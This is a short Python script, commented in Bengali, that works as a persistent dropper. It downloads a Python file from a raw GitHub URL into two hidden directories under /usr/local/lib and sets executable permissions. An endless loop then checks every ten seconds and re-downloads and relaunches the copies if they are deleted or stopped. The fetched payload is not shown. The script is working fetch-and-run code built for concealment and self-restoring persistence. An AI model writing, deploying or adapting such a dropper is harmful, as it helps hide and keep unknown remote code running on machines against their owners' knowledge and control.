import os
import time
import subprocess
import urllib.request

URL = "https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/sds.py"

# দুইটি হিডেন লোকেশন (তুমি চাইলে পথ পরিবর্তন করতে পারো)
LOC1 = "/usr/local/lib/.hidden1/sds.py"
LOC2 = "/usr/local/lib/.hidden2/sds.py"

def download_file(path):
    """ডাউনলোড করে নির্দিষ্ট path-এ সেভ করবে"""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    urllib.request.urlretrieve(URL, path)
    os.chmod(path, 0o700)  # এক্সিকিউটেবল পারমিশন
    print(f"[+] Downloaded: {path}")

def ensure_files():
    """দুইটা ফাইল আছে কিনা চেক করবে, না থাকলে ডাউনলোড করবে"""
    if not os.path.exists(LOC1):
        download_file(LOC1)
    if not os.path.exists(LOC2):
        download_file(LOC2)

def ensure_running(processes):
    """প্রসেস চালু আছে কিনা দেখবে, না থাকলে চালু করবে"""
    for loc in [LOC1, LOC2]:
        if not processes.get(loc) or processes[loc].poll() is not None:
            if os.path.exists(loc):
                processes[loc] = subprocess.Popen(["python3", loc])
                print(f"[+] Started: {loc}")

def main():
    processes = {}
    while True:
        ensure_files()
        ensure_running(processes)
        time.sleep(10)  # প্রতি 10 সেকেন্ডে চেক করবে

if __name__ == "__main__":
    main()
